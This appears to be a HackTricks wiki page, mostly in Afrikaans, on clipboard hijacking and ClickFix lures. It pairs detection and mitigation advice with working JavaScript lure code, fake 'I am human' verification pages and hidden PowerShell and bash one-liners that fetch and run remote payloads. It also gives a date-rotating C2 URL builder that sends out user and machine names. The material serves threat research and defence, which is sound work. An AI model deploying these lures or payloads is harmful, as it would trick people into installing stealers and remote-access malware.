# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Plak nooit iets wat jy nie self gekopieer het nie." – oud maar steeds geldende raad

## Oorsig

Clipboard hijacking – also known as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer en plak sonder om dit na te gaan. ’n Kwaadwillige webblad (of enige JavaScript-capable konteks soos ’n Electron of Desktop-toepassing) plaas programmatis deur die aanvaller beheer­de teks in die stelsel-clipboard. Slachtoffers word aangemoedig, gewoonlik deur sorgvuldig saamgestelde social-engineering instruksies, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminal te open en die clipboard-inhoud *plak*, wat onmiddellik ewekansige opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen aanhangsel geopen word nie**, omseil die tegniek die meeste e-pos- en webinhoud-sekuriteitskontroles wat aanhangsels, macros of direkte opdraguitvoering monitor. Die aanval is daarom gewild in phishing-kampanjes wat bekende malwarefamilies soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Sommige macOS infostealers kloon installasiewebwerwe (bv. Homebrew) en **dwing die gebruik van ’n “Copy” knoppie** sodat gebruikers nie slegs die sigbare teks kan merk nie. Die clipboard-inskrywing bevat die verwagte installasie-opdrag plus ’n aangehegte Base64 payload (bv. `...; echo <b64> | base64 -d | sh`), sodat ’n enkele plak albei uitvoer terwyl die UI die ekstra fase wegsteek.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik; nuwer veldtogte maak staat op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Die ClickFix / ClearFake Flow

1. Gebruiker besoek 'n typosquatted of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingespuite **ClearFake** JavaScript roep `unsecuredCopyToClipboard()` helper aan wat stilweg 'n Base64-encoded PowerShell one-liner in die klembord stoor.
3. HTML-instruksies vertel die slagoffer om: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` voer uit en laai 'n argief af wat 'n legitieme uitvoerbare lêer plus 'n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die loader ontsleutel addisionele stadiums, injekteer shellcode en installeer persistence (bv. scheduled task) – uiteindelik word NetSupport RAT / Latrodectus / Lumma Stealer uitgevoer.

### Voorbeeld NetSupport RAT-ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitiem Java WebStart) deursoek sy gids na `msvcp140.dll`.
* Die kwaadwillige DLL los APIs dinamies op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, ontsleutel hulle met 'n rolling XOR-sleutel `"https://google.com/"`, injecteer die finale shellcode en ontpak **client32.exe** (NetSupport RAT) na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader in **cscript.exe** uit
3. Haal 'n MSI payload af → plaas `libcef.dll` langs 'n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-oproep loods 'n verborge PowerShell-skrip wat `PartyContinued.exe` aflaai, `Boat.pst` (CAB) uitpak, `AutoIt3.exe` herbou via `extrac32` en lêer-konkatenasie, en laastens 'n `.a3x`-skrip laat loop wat browser credentials na `sumeriavgv.digital` exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-campagnes slaan lêer aflaaie heeltemal oor en beveel slagoffers aan om 'n one‑liner te plak wat JavaScript via WSH aflaai en uitvoer, dit persists, en rotates C2 daily. Voorbeeld van 'n waargenome ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Obfuscated URL word tydens uitvoering omgekeer om oppervlakkige inspeksie te omseil.
- JavaScript maak homself persistent via Startup LNK (WScript/CScript), en kies die C2 op grond van die huidige dag – wat vinnige domain rotation moontlik maak.

Minimale JS-fragment gebruik om C2s volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die volgende fase ontplooi gewoonlik 'n loader wat persistence vestig en 'n RAT (bv. PureHVNC) aflaai, dikwels TLS aan 'n hardgekodeerde sertifikaat bind en verkeer in stukke opdelen.

Detection ideas specific to this variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Opstartartefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met 'n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU en command‑line telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang skripte te voed sonder lang command‑lines.
- Geskeduleerde Tasks wat daarna LOLBins uitvoer soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` onder 'n updater‑agtige taak/pad (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks-roterende C2-hostnames en URLs met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korreleer clipboard write-gebeurtenisse gevolg deur Win+R-plak en dan onmiddellike `powershell.exe`‑uitvoering.

Blue-teams kan clipboard-, process-creation- en registry-telemetrie kombineer om pastejacking-misbruik te lokaliseer:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou 'n geskiedenis van **Win + R** opdragte – kyk vir ongewone Base64 / obfuscated inskrywings.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** vir lêer-kreasies onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688‑gebeurtenis.
* EDR clipboard sensors (indien teenwoordig) – korreleer `Clipboard Write` gevolg onmiddellik deur 'n nuwe PowerShell‑proses.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse veldtogte masseproduseer vals CDN/browser-verifikasiebladsye ("Just a moment…", IUAM-style) wat gebruikers dwing om OS‑spesifieke opdragte vanaf hul clipboard in native consoles te plak. Dit skuif uitvoering uit die browser sandbox en werk oor Windows en macOS.

Key traits of the builder-generated pages
- OS‑detectie via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD vs. macOS Terminal). Opsionele decoys/no-ops vir nie‑ondersteunde OS om die illusie te behou.
- Outomatiese clipboard‑copy op skynbaar onskadelike UI‑aksies (checkbox/Copy) terwyl die sigbare teks van die clipboard‑inhoud kan verskil.
- Mobiele blokkering en 'n popover met stap‑vir‑stap instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuscation en enkel-lêer injector om 'n gekompromitteerde site se DOM te oorskryf met 'n Tailwind‑gestileerde verifikasie UI (geen nuwe domeinregistrasie benodig nie).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat die uitvoering voortgaan nadat die terminal gesluit is, wat sigbare artefakte verminder.

In-place page takeover op gekompromitteerde webwerwe
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detectie- en jagideeë spesifiek vir IUAM-styl lokmiddele
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page vervanging in verdagte kontekste.
- Windows-eindpunt: `explorer.exe` → `powershell.exe`/`cmd.exe` kort nadat daar 'n blaaier-reaksie was; batch/MSI installers uitgevoer vanaf `%TEMP%`.
- macOS-eindpunt: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` skep naby blaaiergebeure; agtergrondtake wat die terminal se sluiting oorleef.
- Korreleer `RunMRU` Win+R-geskiedenis en clipboard-skryfbeweginge met daaropvolgende konsoleproses-skepping.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigering

1. Blaaierverharding – deaktiveer clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) of vereis 'n gebruikersgebaar.
2. Sekuriteitsbewustheid – leer gebruikers om *type* sensitiewe opdragte of eers in 'n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitraire one-liners te blokkeer.
4. Netwerkbeheer – blokkeer uitgaande versoeke na bekende pastejacking en malware C2-domeine.

## Verwante Truuks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
